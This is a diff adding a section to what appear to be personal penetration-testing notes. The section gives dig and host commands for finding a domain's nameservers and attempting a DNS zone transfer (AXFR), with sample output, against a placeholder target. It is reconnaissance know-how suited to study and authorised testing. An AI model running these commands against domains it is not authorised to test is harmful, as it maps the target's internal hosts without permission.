@@ -54,6 +54,37 @@ https://www.deadlinkchecker.com/
 https://ahrefs.com/
 
 
+=================================================================================================================================
+DNS Zone Transfer Vulnerability
+------------------------------->>
+1. Find the DNS Nameservers for the Target
+> dig ns target.com
+        or 
+> host -t ns target.com
+ 
+
+Sample Output:
+target.com.    3600    IN    NS    nstm1.digi.ninja.
+target.com.    3600    IN    NS    nstm2.digi.ninja.
+
+2. Attempt a Zone Transfer
+> dig @nstm1.digi.ninja target.com axfr (If successful, this will dump all DNS records for the domain. If not, it will show Transfer failed.)
+ { dig @nstm1.digi.ninja axfr target.com}
+
+## Repeat with other nameservers if necessary:
+> dig @nstm2.digi.ninja target.com axfr
+
+
+3. (Optional) Use host for Zone Transfer
+> host -l target.com nstm1.digi.ninja
+
+
+✅ Successful Zone Transfer
+If the server is misconfigured and allows it, you will see output like:
+sub1.target.com has address 192.168.1.10
+mail.target.com has address 192.168.1.20
+www.target.com has address 192.168.1.30
+
 
 =====================================================================================================
 Signup page Vulnerabilities
